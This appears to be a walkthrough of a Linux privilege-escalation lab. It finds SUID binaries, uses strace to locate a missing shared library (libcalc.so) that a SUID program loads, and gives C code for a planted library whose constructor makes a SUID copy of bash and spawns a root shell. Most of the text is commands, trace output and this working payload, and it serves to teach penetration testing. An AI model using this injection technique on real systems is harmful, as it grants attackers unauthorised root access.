`find / -type f -perm -04000 -ls 2> /dev/null`

Run that and you get this output.

We're actually going to focus here on the `/usr/local/bin/suid-so`.  If we look, we see that it's SUID is set (-rwSr-Sr-x).  The two S's refer to the SUID.  Also, we try to run it and get the following output.

``` 
TCM@debian:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
```

So we can't see what's going on here, or can we?

Use a tool called strace to essentially watch what's going on in the background.

`strace /usr/local/bin/suid-so 2>&1`

This command by itself will spit out a bunch of information.  We can `grep` the output down.  If we scroll up in the original output we see some items with "access" and "open" and "no such file".  Let's see if we can isolate that.

`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`

Much cleaner.

```
TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

The big one here is the one in the /user/ directory.  The libcalc.so.

We can go through this list and check the `ls -la` on them.  The libcalc though is the one we want to focus on.

We can add some c code and make the file named that so we can replace it.

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Then compile that and put it where there was the (No File Found) and then rerun the suid-so program in order to kick the script off.

The big thing you are looking for here is a file that is being looked for but isn't found.  And to find it in a place where you have write permissions to make and compile the file into the right location.  Also, in the script, that we're making a copy of /bin/bash and then running things with that copy so we don't mess up the original /bin/bash.
